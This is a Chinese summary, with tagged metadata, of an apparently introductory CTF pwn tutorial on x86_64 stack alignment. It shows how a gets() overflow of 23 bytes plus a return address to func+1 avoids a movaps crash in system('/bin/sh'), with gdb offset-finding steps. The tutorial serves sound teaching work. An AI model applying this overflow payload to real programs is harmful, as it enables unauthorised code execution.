---
title: 从零开始学 PWN 01 - 缘起（栈对齐）
contest: 自学系列 (来源 ctfiot)
year: 2025
difficulty: easy
vuln_type: [ret2libc, pwn_unknown]
tags: [x86_64, stack-alignment, movaps, gets, BUUOJ, cyclic, pwntools, prologue, ret-sled]
attack_chain: ["cyclic 100 生成模式串", "gdb 在 gets 断点看栈帧布局确认 offset=23", "payload = A*23 + p64(func_addr)", "system(\"/bin/sh\") 调用触发 movaps 段错误", "跳过 push rbp 把 ret 改到 func+1 修复 16 字节对齐"]
key_payload: "p64(0x00401186+1) 即跳到 push rbp 之后"
one_liner: 经典 pwn 入坑文 — x86_64 16 字节栈对齐 movaps 崩溃
lesson: x86_64 SystemV ABI 要求调用时 rsp % 16 == 0；劫持 ret 跳到 push rbp 之后可省一次 push 让栈对齐
quality: medium
---

# 从零开始学 PWN 01 — 缘起（栈对齐）

原文 https://www.ctfiot.com/250955.html

## 教学场景
作者 web 出身，最近用 gdb/edb + Frida 玩二进制，先做了个 toy 系列自娱。系列第 1 篇解决 BUUOJ 两个 pwn 题的栈对齐问题。

## 关键知识点：x86_64 16 字节对齐

**正常函数调用栈帧：**
```
call func       ; push ret_addr → rsp -= 8
func:
    push rbp    ; rsp -= 8
    mov rbp, rsp
    ; ... 函数体 ...
    pop rbp     ; rsp += 8
    ret         ; rsp += 8
```

**劫持场景问题：**
我们覆盖 ret_addr 跳到 `func` 入口时，少了一次 `call` 的 push，**rsp % 16 ≠ 0**。
`system()` 内部用 `movaps` 操作 xmm，需要 16 字节对齐 → SIGSEGV。

**解法：跳到 `func+1`（跳过 push rbp）**
```python
system_sh_addr = 0x00401186
# 错
payload = b'A'*23 + p64(0x00401186)
# 对
payload = b'A'*23 + p64(0x00401187)  # push rbp 之后
```

## BUUOJ pwn 演示
1. `cyclic 100` → gdb 断 `gets` → 输入 → finish → 看栈，确定 offset
2. `gets` 题目 offset = 23
3. `read` 题目 offset = 40

## 教学价值
- pwn 入门的"经典坑"，几乎每个新手都遇到过
- 16 字节对齐的修复有 3 种思路：
  1. 跳到 `func+1`（推荐）
  2. 在 ret 前插一个 `ret` gadget（ret sled）
  3. 找 `call func; pop` gadget
- 后续系列可跟"缘分"，作者更新慢
